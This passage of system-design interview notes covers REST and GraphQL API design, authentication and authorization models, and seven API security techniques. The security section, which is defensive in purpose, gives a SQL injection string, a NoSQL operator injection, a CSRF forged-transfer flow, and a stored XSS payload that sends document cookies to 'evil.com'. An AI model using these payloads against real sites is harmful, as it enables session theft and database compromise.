**Do sorting on the backend.** If the frontend must sort 1,000 products by price, it would have to download all 1,000 first — hugely inefficient. Backend sorts, frontend just asks.

**Pagination — three flavours**

| Style | Example | Notes |
|---|---|---|
| **Page-based** | `?page=3&limit=10` | Most intuitive. **Always send `limit`** — otherwise page 3 → end-of-dataset is returned. |
| **Offset-based** | `?offset=20&limit=10` | `offset` = where to start counting; `limit` = how many. Same idea, different framing. |
| **Cursor-based** | `?cursor=eyJpZCI6MTIzfQ&limit=10` | Cursor = an opaque hash/token pointing at a position. |

**Why cursor wins at scale (interview gold):** offset pagination gets slower the deeper you go (the DB must scan and discard `offset` rows), and it **skips/duplicates rows** when items are inserted or deleted mid-pagination. Cursor pagination is O(1)-ish and stable. Use it for infinite scroll and large datasets.

**Benefits of all three:** saves **server bandwidth** · improves **performance on both server and client** · gives the frontend **flexibility** to fetch exactly what it needs.

### 10.3 HTTP methods & CRUD

| Method | CRUD | Example | Safe? | Idempotent? |
|---|---|---|---|---|
| `GET` | Read | `GET /api/v1/products` | ✅ Yes | ✅ Yes |
| `POST` | Create | `POST /api/v1/products` | ❌ No | ❌ **No** |
| `PUT` | Update (**replace whole resource**) | `PUT /api/v1/products/123` | ❌ No | ✅ Yes |
| `PATCH` | Update (**partial**) | `PATCH /api/v1/products/123` | ❌ No | ⚠️ Usually |
| `DELETE` | Delete | `DELETE /api/v1/products/123` | ❌ No | ✅ Yes |

**Definitions to recite:**
- **Safe** = does not modify server state. `GET` two or three times returns the same output (barring genuine new data).
- **Idempotent** = making the same request N times has the same effect as making it once.

**Why POST is not idempotent:** each `POST /products` **creates a new resource**. Call it 3× → you get product #1, #2, #3 with three different IDs.

**PUT vs PATCH — the classic question**

```jsonc
// PUT /products/123  → REPLACES the entire resource
{ "name": "New Name", "price": 99.99, "description": "...", "category": "..." }
// any field you omit is wiped

// PATCH /products/123 → updates ONLY the given fields
{ "name": "New Name" }
// price, description, category remain untouched
```

`DELETE /products/123` carries **no request body** — the URL fully identifies what to remove.

### 10.4 Status codes & error handling

| Code | Name | Use it when |
|---|---|---|
| **200** | OK | Successful `GET` / `PUT` / `PATCH` |
| **201** | Created | Successful `POST` — **not 200!** A create must say "resource has been created" |
| **204** | No Content | Successful `DELETE`, or an update with nothing to return |
| **301 / 302** | Moved Permanently / Found | Resource has moved; redirect to the new URL |
| **304** | Not Modified | Conditional GET, client's cache is still valid |
| **400** | Bad Request | Generic client error: invalid parameters, malformed JSON |
| **401** | Unauthorized | **Not authenticated** — no/invalid credentials |
| **403** | Forbidden | Authenticated but **not authorized** for this resource |
| **404** | Not Found | The requested resource genuinely doesn't exist in the DB |
| **409** | Conflict | Duplicate resource, version conflict |
| **422** | Unprocessable Entity | Syntactically valid but semantically invalid |
| **429** | Too Many Requests | **Rate limit exceeded** |
| **500** | Internal Server Error | Unexpected server-side failure — the client did nothing wrong |
| **502 / 503 / 504** | Bad Gateway / Unavailable / Timeout | Upstream failures, maintenance, timeouts |

**The 400 vs 404 distinction from the video:**
- Malformed request / invalid params / bad JSON → **400 Bad Request**
- Well-formed request for a product ID that isn't in the DB → **404 Not Found**

**5xx** = the client requested everything properly and *we* broke. Return a generic server error message (never leak stack traces).

Consistent error body:
```json
{
  "error": {
    "code": "PRODUCT_NOT_FOUND",
    "message": "Product with id 123 does not exist",
    "requestId": "req_9f2c1a"
  }
}
```

### 10.5 REST best practices — checklist

1. ✅ **Plural nouns** — `/products`, not `/product`, and never `/getProducts`.
2. ✅ **Proper HTTP methods** — `DELETE /users/123`, not `POST /users/123/delete`. No `/delete` in the URL, ever.
3. ✅ **Support filtering, sorting AND pagination** — not just pagination. `?page=3` alone is bad; you can't cap the response size. `?page=3&limit=20&sort=price_asc` is good.
4. ✅ **Versioning** — prefix every path: `/api/v1/products`. When v2 breaks something, existing clients keep using v1 untouched while you build v3. **End users are never impacted.**
5. ✅ **Statelessness** — every request self-contained.
6. ✅ **Correct status codes** — 201 on create, 204 on delete.
7. ✅ **Consistent naming/casing** across the entire surface.
8. ✅ **HTTPS everywhere**, authN/authZ, input validation, rate limiting.

> **Bonus REST constraints (Fielding's 6, often asked):** Client–Server · **Stateless** · **Cacheable** · **Uniform Interface** · **Layered System** · Code-on-Demand (optional). Also know **HATEOAS** (responses embed links to related actions) — rarely implemented, frequently asked.

---

## 11. GraphQL

### 11.1 Why GraphQL exists

Created at **Facebook** to fix a specific pain: clients had to make **multiple API calls** and *still* didn't get exactly the data they needed.

```
REST — one screen, three round trips:
GET /api/v1/users/123              → user details
GET /api/v1/users/123/posts        → posts
GET /api/v1/users/123/followers    → followers
```
The page can't render until all three resolve → latency stacks up. And each response gives you **more fields than you need** (over-fetching) or **too few** (under-fetching → yet another call).

```
GraphQL — one endpoint, one round trip:
POST /graphql
```
```graphql
query {
  user(id: "123") {
    name
    posts    { title content }
    followers { name }
  }
}
```
The client **specifies the shape of the response**; one endpoint handles all data interactions. Note this is still an ordinary HTTP request.

### 11.2 REST vs GraphQL — the real comparison

| Aspect | **REST** | **GraphQL** |
|---|---|---|
| Endpoints | **Resource-based**, many (`/users`, `/posts`, `/followers`) | **Single** endpoint (`/graphql`) |
| Fetching related data | Often **multiple requests** | **One request**, precisely shaped |
| Operations defined by | **HTTP methods** (GET/POST/…) | Query language (`query`/`mutation`/`subscription`) |
| Response structure | **Fixed** — same shape every time | **Client-defined** — client specifies structure |
| Over/under-fetching | Common | Eliminated by design |
| Versioning | **Explicit** — `/v1`, `/v2` | **Schema evolution without versioning** (or field-level: `followersV2`) |
| Caching | **HTTP caching** via headers (built-in, free) | **Application-level caching** (you build it — Apollo/Relay normalised cache, persisted queries) |
| Error signalling | HTTP status codes | Always **200 OK** + `errors[]` array |

**On versioning:** GraphQL schemas normally evolve additively — add fields, deprecate old ones with `@deprecated`. But a **field-level versioning pattern** (`followers` → `followersV2`) is common. You *can* mutate a field in place if you're certain no client uses the old shape.

### 11.3 Schema design & type system

The **schema is the contract** between client and server.

```graphql
type User {
  id: ID!
  name: String!
  email: String
  posts: [Post!]!          # non-primitive → references another type
  followers: [User!]!
}

type Post {
  id: ID!
  title: String!
  content: String!
  comments: [Comment!]!
}

type Query {                            # reads — equivalent of GET
  user(id: ID!): User
  posts(limit: Int = 10): [Post!]!
}

type Mutation {                         # writes — equivalent of POST/PUT/PATCH/DELETE
  createUser(input: CreateUserInput!): User!
  createPost(input: CreatePostInput!): Post!
}

type Subscription {                     # real-time push (over WebSocket)
  postAdded(userId: ID!): Post!
}

input CreateUserInput {                 # best practice: input types for mutations
  name: String!
  email: String!
}
```

- **Types** define entities and their fields. Non-primitive fields reference other types (`posts: [Post]`), which are defined separately.
- **Queries** = read data (like `GET`). You declare the arguments and the return type.
- **Mutations** = write data (like `POST`/`PUT`/`PATCH`/`DELETE`).
- **Subscriptions** = real-time updates.
- `!` = non-nullable.

**A good schema mirrors your domain model and is intuitive + flexible.**

### 11.4 Querying and mutating

```graphql
# Query — fetch exactly what's needed
query GetUserProfile {
  user(id: "123") {
    name
    posts { title }         # only titles — no bodies, no images
  }
}
```

```graphql
# Mutation — write, then choose what comes back
mutation {
  createPost(input: { title: "Hello", body: "World" }) {
    id                      # the client picks the response shape here too
    title
  }
}
```

### 11.5 Error handling — the big gotcha

> **GraphQL always returns HTTP `200 OK`, even on errors.**

Errors are reported in a top-level `errors` array, and **partial data can still be returned** alongside them:

```json
{
  "data": { "user": null },
  "errors": [
    {
      "message": "User not found",
      "path": ["user"],
      "extensions": { "code": 404 }
    }
  ]
}
```
Because the HTTP status is always 200, you must carry the real status/code **inside** the error object so the client knows *what kind* of error it is.

### 11.6 GraphQL best practices

1. ✅ **Keep schemas small and modular.**
2. ✅ **Avoid deeply nested queries.** `user → posts → comments → author → posts → …` can nest infinitely. Enforce a **query depth limit** (e.g. max 6–7 levels).
3. ✅ **Meaningful naming** for types and fields — client and server share the same schema, so names are the API.
4. ✅ **Use `input` types for mutations** rather than long argument lists.

> **Interview add-ons the video doesn't mention:**
> - **N+1 problem** — resolving `posts` for 100 users fires 100 DB queries. Fix with **DataLoader** (per-request batching + caching).
> - **Query cost analysis / complexity limits** — depth limits alone don't stop `first: 1000000`.
> - **Persisted queries** — hash allowlisted queries; restores HTTP/CDN caching and blocks malicious queries.
> - **Disable introspection in production** for private APIs.

### 11.7 When to use which

- **REST** → public APIs, simple CRUD, you want free HTTP/CDN caching, broad client compatibility.
- **GraphQL** → complex/varied UIs, many client types (web + iOS + Android each needing different fields), rapid frontend iteration, aggregating multiple backends.
- **gRPC** → internal microservice communication where latency and payload size dominate.

---

## 12. Authentication

> **AuthN answers: "WHO are you?"** — it verifies that the user or service is who they claim to be.
>
> 📘 **Companion deep dive:** [stateless-services-sessions-tokens.md](stateless-services-sessions-tokens.md) — cookie attributes, JWT attacks, refresh-token rotation, PKCE, browser storage and the session-store capacity math.

### 12.0 The confusion the video sets out to fix ⭐

These get mixed up in nearly every interview:

| Thing | What people think it is | What it **actually** is |
|---|---|---|
| **JWT** | An authentication method | A **token format** (a signed JSON object) |
| **Bearer** | The same as JWT | An **authorization *scheme*/pattern**: "whoever holds this token gets access" |
| **OAuth 2.0** | An authentication method | An **authorization framework** (delegated access) |
| **SSO** | An authentication method | A **user-experience pattern** built on identity protocols |
| **OIDC** | The same as OAuth 2 | An **identity layer built *on top of* OAuth 2** — this is the actual authentication part |

Postman lumps them all under a dropdown labelled "Auth Type", which is a big source of the confusion.

### 12.1 Where AuthN sits

```
       login request
User ───────────────► ┌──────────────┐
or                    │ Auth check   │── ❌ invalid → 401 Unauthorized
Service               └──────┬───────┘
                       ✅ valid
                             ▼
                   API Gateway → Service Layer → Data Storage
                             │
                             └─► then AUTHORIZATION decides what you may do
```

---

### 12.2 Basic Authentication

The simplest form.

```
1. Client:  GET /api/users
2. Server:  401 Unauthorized          ← prompts for credentials
3. Client:  GET /api/users
            Authorization: Basic dXNlcjpwYXNzd29yZA==     ← base64(username:password)
4. Server:  200 OK + user data     OR     401 Unauthorized
```

❌ **Problems:**
- **Base64 is encoding, not encryption — trivially reversible.** Insecure unless wrapped in HTTPS.
- **Credentials are sent on every single request.**
- Rarely used in production today outside internal tools.

### 12.3 Digest Authentication

Slightly better: instead of the plain password, the client sends an **MD5 hash** (of username, password, a server nonce, the method and URI).

```
1. Client:  GET /api/users
2. Server:  401 Unauthorized + nonce
3. Client:  Authorization: Digest username="john", response="6629fae4...", nonce="..."
4. Server:  200 OK  OR  401
```

✅ The password never traverses the wire in reversible form.
❌ **MD5 is cryptographically broken**; the scheme is **outdated and rarely used today** — better options exist.

### 12.4 API Key Authentication

Generate a **unique key per client**; the client sends it with every request.

```http
GET /api/users
X-API-Key: sk_live_a1b2c3d4e5f6...
# or:  Authorization: ApiKey sk_live_a1b2c3...
```

**Server flow:** look up the key (stored **hashed** in a DB, alongside its **scopes**) in a permissions/users table → valid ⇒ 200 + data → invalid ⇒ **401 Unauthorized** → key entirely missing ⇒ **400 Bad Request** (the key is required to use this system).

❌ **Weaknesses:**
- **If it leaks, anyone can act as you.** No proof of possession.
- **No built-in expiration** unless you implement it.
- **API keys are just random strings with no embedded information** — unlike JWTs, which carry claims. The server can't know who owns the key or what permissions it has **without a database lookup**.

✅ Good for: server-to-server integrations, third-party developer platforms (Stripe, OpenAI, etc.). Always pair with scopes, rotation, and rate limits.

### 12.5 Session-Based Authentication (the traditional web approach)

```
1. User logs in with credentials
2. Server creates a SESSION in session storage → gets sessionId
3. Server sets a session COOKIE on the client
4. Every later request carries the cookie
5. Server looks up the session in storage
      found + valid → return user data (authorized)
      not found     → 401 Unauthorized
```

**Session storage options**

| Option | Trade-off |
|---|---|
| **In-memory** (a variable) | Simplest — but **lost on restart/crash**, and doesn't work across multiple servers |
| **Redis** ⭐ | **The production go-to**: fast + **built-in key expiration** |
| **SQL database** | Durable but slower; extra load on your primary DB |
| **File system** | Very rare; **not scalable** |

❌ **The core challenge: sessions are STATEFUL.** The server must *remember* every session. That works great for traditional web apps but **doesn't scale easily for APIs or distributed systems** — every app server needs access to the same session store, and you must handle sticky sessions or shared state.

### 12.6 Token-Based Authentication — Bearer & JWT

Modern apps send a **token** with each request instead of maintaining server-side sessions.

```http
GET /api/users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMi...
```

**Bearer ≠ JWT.** *Bearer* means "whoever bears (holds) this token gets access" — it's a **pattern**, not a specific method. The **most common kind of bearer token is a JWT**.

**JWT = JSON Web Token**: a **signed JSON object** containing claims.

```
header.payload.signature        (three base64url segments, dot-separated)
```
```jsonc
// header
{ "alg": "HS256", "typ": "JWT" }
// payload (claims)
{ "sub": "user_123", "email": "john@example.com", "roles": ["editor"],
  "iat": 1735689600, "exp": 1735693200, "iss": "auth.example.com" }
// signature = HMACSHA256(base64(header) + "." + base64(payload), secret)
```

**Why JWT changed things — statelessness:**

| Era | Mechanism | Problem |
|---|---|---|
| **Pre-JWT tokens** | Token = an opaque random string → server looks it up in a DB/cache | **Stateful.** Every request hits the DB/cache. |
| **JWT** | Token **carries its own signed claims** | **Stateless & self-contained.** Server just **verifies the signature locally** — no DB hit. Reduces DB load, simplifies auth, and **scales horizontally**. |

**Flow**
```
1. POST /login {credentials}  → validate → generate & return JWT
2. GET /api/users  Authorization: Bearer <jwt>
3. Server verifies the SIGNATURE locally (no DB call)
      valid   → 200 + data
      invalid/expired → 401 Unauthorized
```

⚠️ **The trade-off:** because it's stateless, you **cannot easily revoke a JWT** before it expires. Mitigations: short TTLs, a token denylist (reintroduces state), or `jti` + version counters.

### 12.7 Access Tokens vs Refresh Tokens

Modern systems issue **two** tokens at login:

| | **Access token** | **Refresh token** |
|---|---|---|
| Lifetime | **Short** — 15 min to 1 hour | **Long** — days or weeks |
| Purpose | Sent with every API call | Used **only** to obtain a new access token |
| Sent to | Resource/API servers | Only the auth server's `/refresh` endpoint |

```
Login  ──► access token (15 min)  +  refresh token (7 days)
          │                          │
          │ used on API calls        │ stored in an HTTP-ONLY COOKIE
          ▼                          ▼
   access token expires → 401 → POST /refresh with refresh token
                              → new access token → retry the request ✅
```

> 🔐 **Never store the refresh token in `localStorage`. Store it in an `HttpOnly` cookie** — this prevents **XSS** from stealing it (JavaScript can't read `HttpOnly` cookies).
> Add `Secure` and `SameSite=Strict/Lax` too. Because cookies are auto-sent, you then need **CSRF** protection (§14).

**Result:** users stay logged in without re-entering credentials, while any stolen access token is useless within minutes.

### 12.8 OAuth 2.0 — an **authorization framework** (not authentication!)

> OAuth 2 answers: **"What can this app access *on behalf of* the user?"**

**Scenario:** you want to let a third-party app read files from your Google Drive.

```
1. App → redirects you to Google's CONSENT SCREEN
2. Consent screen shows the PERMISSION REQUEST ("read your Drive files")
3. You click Allow
4. Google returns an AUTHORIZATION CODE to the app
5. App exchanges the code for an ACCESS TOKEN  (server-to-server, with its client secret)
6. App calls the Drive API with that token → receives your files
```

**The subtle, crucial point the video stresses:** you get back an *access token*, so it *feels* like authentication — **but the access token only proves the app is allowed to access certain resources. It does not tell the app *who you are*.** No identity is conveyed.

You never hand over your username and password — the token represents **only the permissions you approved**.

### 12.9 OpenID Connect (OIDC) — authentication **on top of** OAuth 2

OIDC is the missing identity layer. "Sign in with Google/GitHub/Microsoft" is OIDC.

```
1. Click "Sign in with Google"
2. Redirect to the authorization endpoint → login screen
3. Enter credentials + consent
4. Provider returns an AUTHORIZATION CODE
5. App exchanges the code for TOKENS:
        ├── access token  → OAuth 2 AUTHORIZATION (call APIs)
        └── ID TOKEN      → OIDC AUTHENTICATION (a JWT with your IDENTITY:
                             email, username, user ID, `sub`)
6. App verifies the ID token's SIGNATURE and extracts the user's identity
7. App creates its OWN session / issues its own tokens for that user
```

| Token | Standard | Purpose | Format |
|---|---|---|---|
| **Access token** | OAuth 2 | **Authorization** — what the app may do | Often opaque |
| **ID token** | OIDC | **Authentication** — who the user is | **Always a JWT** |
| Refresh token | OAuth 2 | Renew the access token | Opaque |

✅ Modern, secure, scales well — which is why almost every app uses it today.

### 12.10 Single Sign-On (SSO)

> **SSO is a user-experience pattern, not an authentication method:** *log in once, access multiple services.*

```
Log in ONCE to the Identity Provider (Google / Okta / Azure AD)
        ├── global session stored in session storage
        └── SSO cookie returned to the client
   ↓
Gmail          → session verified → ✅ access (you logged in here)
Google Drive   → session verified → ✅ access (NO second login)
YouTube        → session verified → ✅ access
Google Calendar→ session verified → ✅ access
```

SSO **uses identity protocols underneath** to validate those sessions:

| Protocol | Format | Flow | Where you'll see it |
|---|---|---|---|
| **SAML** (Security Assertion Markup Language) | **XML**-based | Access app → redirect to login → IdP returns a **SAML assertion** (XML) → identity confirmed → access granted | **Enterprise & legacy** — Salesforce, corporate dashboards. Older, but **still widely used and secure**. |
| **OIDC** | **JSON / JWT** | Access app → redirect to login → credentials → user authenticated → **ID token (JWT)** returned → identity confirmed | **Modern** — what Google uses under the hood |

Both are secure and relevant; OIDC is the newer approach.

### 12.11 Authentication methods — summary table

| Method | Stateful? | Security | Use today? |
|---|---|---|---|
| Basic | No | ⚠️ Weak (reversible base64) | Internal tools only, over HTTPS |
| Digest | No | ⚠️ MD5 = broken | Legacy only |
| API Key | Yes (lookup) | ⚠️ Leaks are fatal, no expiry | Server-to-server, dev platforms |
| Session + Cookie | **Yes** | ✅ Good | Traditional server-rendered web apps |
| JWT / Bearer | **No** ⭐ | ✅ Good (short TTL + refresh) | APIs, SPAs, mobile, microservices |
| OAuth 2 | — | ✅ Strong | **Delegated authorization** |
| OIDC | — | ✅ Strong | **Third-party login / SSO** |
| SAML | — | ✅ Strong | **Enterprise SSO** |

---

## 13. Authorization

> **AuthZ answers: "WHAT are you allowed to do?"** — it runs *after* authentication and determines which resources/actions are permitted or denied.

**Real-world anchor — GitHub repository access:**

| User | Role | Can do |
|---|---|---|
| User A | **Write** | Push code |
| User B | **Read** | Read the repo only — no pushes, no PRs |
| User C | **Admin** | Full control: manage settings, delete the repo |

### 13.1 Model 1 — RBAC (Role-Based Access Control) ⭐ most common

Users are assigned **roles**; each role has a **defined set of permissions**.

| Role | Create | Read | Update | Delete | Manage users |
|---|:---:|:---:|:---:|:---:|:---:|
| **Admin** | ✅ | ✅ | ✅ | ✅ | ✅ |
| **Editor** | ✅ | ✅ | ✅ | ❌ | ❌ |
| **Viewer** | ❌ | ✅ | ❌ | ❌ | ❌ |

```
User ──► Role ──► Permissions ──► Resources
```

✅ **Pros:** simple, easy to reason about and audit, scales to large orgs.
❌ **Cons:** **role explosion** when you need fine-grained variants ("editor but only for EU marketing docs on weekdays").

**Where you see it daily:** GitHub, Stripe dashboards, CMS tools, team-management tools, Kubernetes RBAC.

### 13.2 Model 2 — ABAC (Attribute-Based Access Control)

Goes **beyond roles** — decisions are computed from **attributes** + **environment conditions**.

```jsonc
{
  "effect": "allow",
  "action": ["read", "write"],
  "condition": {
    "user.department":       "HR",          // user attribute
    "resource.classification":"internal",   // resource attribute
    "environment.time":      "09:00-18:00", // environment condition
    "environment.location":  "IN"
  }
}
```

| Attribute category | Examples |
|---|---|
| **User attributes** | department, age, clearance level, employment status |
| **Resource attributes** | confidentiality, **owner**, classification, project |
| **Environment attributes** | **time of day**, **location**, **device type**, IP range |

✅ **Pros:** far **more flexible** than RBAC; expresses dynamic, contextual policies. Can be **combined with RBAC**.
❌ **Cons:** **more complex**; needs **good policy management**; policies can **conflict** with each other and are harder to debug/audit.

**Where you see it:** AWS IAM policies, enterprise data governance, zero-trust architectures.

### 13.3 Model 3 — ACL (Access Control List)

Instead of roles or attributes, **each resource carries its own permission list**.

```
Document: quarterly_report.doc
├── Alice  → read
├── Bob    → read, write
└── Carol  → no access
```

Two things are managed per resource: **which users may access it** and **what each of them may do**.

✅ **Pros:** maximum granularity; **user-centric**; perfect for per-object sharing.
❌ **Cons:** **highly specific and hard to scale** with millions of users/objects unless managed very carefully.

**Canonical example: Google Drive / Google Docs.** You share one doc with a colleague as read-only, and another person as editor+commenter. That per-document permission list *is* an ACL. Google proves it can scale — but it takes serious engineering.

### 13.4 Comparing the three

| | **RBAC** | **ABAC** | **ACL** |
|---|---|---|---|
| Decision based on | Role | Attributes + context | Per-resource list |
| Granularity | Coarse | Fine + dynamic | Very fine, per-object |
| Complexity | Low | **High** | Medium |
| Scalability | ✅ Excellent | ✅ Good | ⚠️ Hard at scale |
| Auditability | ✅ Easy | ⚠️ Harder | ⚠️ Harder |
| Example | GitHub, Stripe | AWS IAM | Google Drive |

> **Real systems combine multiple models** to stay flexible and secure — e.g. RBAC for the baseline, ABAC for contextual restrictions, ACL for user-level sharing.

### 13.5 How authorization is *enforced*

**A. OAuth 2 — delegated authorization**

A protocol for when **one service wants to access another service's resources on behalf of a user**.

**Example: deploying to Vercel.** Vercel needs access to your GitHub repos.
- ❌ **Don't** give Vercel your GitHub username + password — that's *full* control and you have no idea what they'd do with it.
- ✅ Instead, **GitHub issues a token representing exactly the permissions you approved** — e.g. read + push to *these specific repos*, but **not delete** them.

```
You ──authorize──► GitHub ──issues scoped token──► Vercel ──uses token──► GitHub API
```
OAuth 2 defines the flow for **securely issuing and validating** those tokens. *You give them the access token, not your password.*

**B. Token-based authorization (JWT / bearer tokens)**

Once authenticated, the token **carries the claims** used for authorization:

```jsonc
{
  "sub":    "user_123",              // identity
  "roles":  ["admin"],               // role claim
  "scopes": ["repo:read","repo:write"], // what they may access
  "exp":    1735693200,              // expiry
  "iss":    "auth.example.com"       // issuer
}
```
Every request carries the token to the backend, which **checks its validity and applies the permission logic**.

**⭐ The key distinction to state in interviews:**
> **Tokens are a *mechanism* that carries identity and claims. Authorization *models* (RBAC/ABAC/ACL) define what is actually allowed.** Don't conflate the two — a JWT is the envelope; RBAC is the rulebook.

### 13.6 AuthN vs AuthZ

| | **Authentication** | **Authorization** |
|---|---|---|
| Question | **Who are you?** | **What can you do?** |
| When | **First** | **After** authentication |
| Failure code | **401** Unauthorized | **403** Forbidden |
| Mechanisms | Passwords, JWT, OIDC, SAML, MFA | RBAC, ABAC, ACL, OAuth 2 scopes |
| Analogy | Showing your passport at the airport | Your boarding pass says seat 14C, not the cockpit |

---

## 14. API Security — 7 Techniques

> "APIs are doors into your system. Leave them unprotected and attackers walk right in."
>
> 🔐 **Companion deep dive:** these seven techniques are the *controls*. For the design principles underneath them — threat modelling, least privilege and zero trust, trusted computing bases, blast-radius containment, graceful degradation under attack, and the software supply chain — see [secure-reliable-systems.md](secure-reliable-systems.md).

### 1️⃣ Rate Limiting

Controls **how many requests a client may make in a given time window**.

```
User A: 100 requests/min allowed
        request #101 → ❌ BLOCKED, must wait for the window to reset
```

**Without it:** attackers send thousands of requests/minute → **overwhelm and take down your system**, or **brute-force** credentials/data.

**Three levels — apply all three:**

| Level | Example | Purpose |
|---|---|---|
| **Per endpoint** | `/comments` gets a strict per-minute cap | Protect expensive or abuse-prone routes |
| **Per user / per IP** | IP `D` exceeds 100/min → block `D` only | Stops individual abusers without hurting A, B, C |
| **Global / overall** | Total inbound traffic crosses a ceiling → temporarily block everything while you investigate | ⭐ **DDoS defence** |

**Why global limits matter (great interview point):** per-IP limiting alone doesn't stop a **botnet** — an attacker spins up 50 bots, each staying under the 100/IP limit, and collectively floods you. An **overall** rate limit catches aggregate abuse that per-client limits miss.

Return **429 Too Many Requests** with a `Retry-After` header.

> Algorithms worth naming: **Token Bucket** (allows bursts), **Leaky Bucket** (smooths output), **Fixed Window** (simple, has boundary spikes), **Sliding Window Log/Counter** (accurate, more memory). Redis is the usual distributed counter store.

### 2️⃣ CORS — Cross-Origin Resource Sharing

Controls **which domains may call your API from a browser**.

```
✅ Origin: https://app.yourdomain.com    → allowed
❌ Origin: https://app.anotherdomain.com → blocked
```

Without proper CORS, **malicious websites could trick a user's browser into making requests on their behalf**.

```http
Access-Control-Allow-Origin: https://app.yourdomain.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```
⚠️ **Never use `Access-Control-Allow-Origin: *` together with credentials.** Maintain an explicit allowlist.

> Nuance worth knowing: CORS is enforced by the **browser**, not the server — it does not protect against non-browser clients (curl, Postman, server-side attackers).

### 3️⃣ SQL / NoSQL Injection

Happens when **user input is placed directly into a database query**.

```sql
-- vulnerable
"SELECT * FROM users WHERE email = '" + userInput + "'"

-- attacker sends:  ' OR '1'='1
SELECT * FROM users WHERE email = '' OR '1'='1'
--                                  ↑ bypasses the check ENTIRELY
```
The attacker can then **read any data, modify anything, or delete all your tables**. NoSQL equivalent: injecting operator objects like `{ "$ne": null }`.

✅ **The fix: always use parameterized queries / prepared statements, or ORM safeguards.**

```js
// parameterized — the driver never treats input as SQL
db.query('SELECT * FROM users WHERE email = $1', [userInput]);
```
Plus: input validation/allowlisting, least-privilege DB accounts, never concatenate strings into queries.

### 4️⃣ Firewalls (WAF)

A firewall is a **gatekeeper sitting between the incoming traffic and your API**, filtering malicious from normal traffic.

```
Internet ──► [ WAF ] ──► API
              ├─ ❌ suspicious SQL keywords → blocked
              ├─ ❌ strange HTTP methods    → blocked
              ├─ ❌ known attack patterns   → blocked
              └─ ✅ normal traffic          → forwarded
```
Example: **AWS WAF** blocks requests matching known attack signatures while letting legitimate requests through. (Also: Cloudflare WAF, Azure WAF, ModSecurity.)

### 5️⃣ VPN / Network Isolation

Some APIs are **private and should only be reachable from specific networks**.

```
Public API   ← reachable from the internet by any user       ✅
Internal API ← inside the VPN
               user on the open web  → ❌ BLOCKED
               user on company VPN   → ✅ allowed
```
**Classic use case:** an **internal admin dashboard** whose API is only reachable by employees connected to the company VPN.

> Cloud equivalent: private subnets, security groups, VPC peering, PrivateLink, service meshes with mTLS, zero-trust networking.

### 6️⃣ CSRF — Cross-Site Request Forgery

**The attack:** tricks a **logged-in user's browser** into making unwanted requests to your API.

```
1. You're logged into your bank; the bank authenticates via SESSION COOKIES
2. You visit a malicious site
3. That site auto-submits a HIDDEN form:  POST bank.com/transfer  {to: attacker, amount: 5000}
4. Your browser AUTOMATICALLY attaches your bank session cookie
5. The bank sees a valid cookie → executes the transfer ❌
```
The root cause: **cookies are sent automatically by the browser on cross-site requests.**

✅ **Fix: CSRF tokens used *in combination with* the session cookie.** The server checks that the session cookie is present **AND** that the submitted CSRF token matches the one it issued. The attacker's site cannot read your CSRF token (same-origin policy), so its forged request is rejected while your genuine request succeeds.

Also: `SameSite=Strict/Lax` cookies, verify `Origin`/`Referer`, and require re-auth for sensitive operations.

### 7️⃣ XSS — Cross-Site Scripting

**The attack:** lets attackers **inject scripts into web pages served to other users**.

```
1. Comment box → attacker submits:   <script>fetch('evil.com?c='+document.cookie)</script>
2. API stores it in the database (unsanitised)  ❌
3. Another user loads the comments page
4. The injected script is served into their page
5. THEIR browser EXECUTES the attacker's JavaScript
   → steals their cookies / session, injects content, keylogs, defaces the page
```
This is **stored (persistent) XSS** — the most dangerous kind, because it hits every viewer. (Also exists: reflected XSS and DOM-based XSS.)

✅ **Fixes:**
- **Sanitise/validate input** on the server (DOMPurify, allowlists)
- **Escape output** contextually when rendering (HTML/attribute/JS/URL contexts)
- **Content-Security-Policy** header to forbid inline scripts and untrusted sources
- **`HttpOnly` cookies** so stolen-cookie XSS can't read session tokens (ties back to §12.7)
- Use framework auto-escaping (React/Angular escape by default — don't reach for `dangerouslySetInnerHTML` / `bypassSecurityTrustHtml`)

### Security summary

| # | Threat | Defence |
|---|---|---|
| 1 | Abuse, brute force, DDoS | **Rate limiting** (per-endpoint + per-user/IP + global) |
| 2 | Malicious cross-origin browser calls | **CORS allowlist** |
| 3 | Database compromise via input | **Parameterized queries / ORM** |
| 4 | Known attack patterns | **WAF / firewall** |
| 5 | Exposure of internal APIs | **VPN / private networks** |
| 6 | Forged authenticated requests | **CSRF tokens + `SameSite` cookies** |
| 7 | Script injection into other users' pages | **Sanitise input, escape output, CSP, `HttpOnly`** |

> Map these to the **OWASP API Security Top 10**: BOLA/IDOR, broken authentication, excessive data exposure, lack of rate limiting, BFLA, mass assignment, security misconfiguration, injection, improper asset management, insufficient logging.

---

# PART II — The Rest of the Roadmap

## Why these sections exist

**Where the video stands:** runtime is **2h 05m 22s**, and the recorded content ends at 2:04. At the very end the presenter says:

> *"What you just watched were the first two parts of my system design mastery course. I also have deep dives into **databases, caching, CDNs and production infrastructure** on my YouTube channel."*

But at **1:58–2:36** he lays out the **full 7-module roadmap**, and the video title advertises all of it. So these modules are *announced in this video* but delivered elsewhere:

| # | Module | In this recording? |
|---|---|---|
| 1 | **Foundations** — core concepts before anything else | ✅ §1–6 |
| 2 | **API design** — APIs that scale and make sense to other developers | ✅ §7–14 |
| 3 | **Databases** — choosing the right DB, designing the data layer properly | ⚠️ Partial (§2 selection only) → **§15 below** |
| 4 | **Caching, CDNs, Load balancing** — making systems fast and reliable | ⚠️ LB only (§4) → **§16–17 below** |
| 5 | **Big data processing** — handling large-scale data the right way | ❌ → **§18 below** |
| 6 | **Designing for production** — systems that work in the real world, not just on your laptop | ❌ → **§19 below** |
| 7 | **System design interviews** — how he designs systems to land senior offers | ❌ → **§20 below** |

> 📌 There's also an **explicit promise left unfulfilled** at 28:55: *"We will talk about how to avoid the **database single points of failure** in the databases section."* — that section never arrives in this recording. **§15.1 fills it.**

Everything below completes the roadmap at the same depth as the rest of these notes. Your existing files [cache.md](cache.md), [DNS.md](DNS.md), [latency.md](latency.md), and [cloud-native.md](cloud-native.md) go deeper on some of it.

---

## 15. Databases, Part 2 — Scaling the Data Tier

§2 covered *which* database to choose. This covers *how to scale it* — the hardest part of most system design interviews, because **the database is almost always the real bottleneck and the last remaining SPOF**.

### 15.1 ⭐ Removing the database SPOF — Replication

Recall the diagram from §6: three API servers, **one database**. The DB dies → everything dies.

